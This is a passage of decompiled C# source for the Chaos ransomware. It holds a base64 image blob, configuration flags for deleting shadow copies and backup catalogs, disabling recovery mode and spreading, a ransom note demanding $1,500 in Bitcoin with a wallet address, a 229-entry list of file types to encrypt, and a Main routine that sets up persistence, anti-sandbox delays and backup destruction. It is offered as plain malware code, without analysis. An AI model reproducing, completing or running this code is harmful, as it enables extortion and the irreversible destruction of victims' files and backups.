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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "IMPORTANT.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

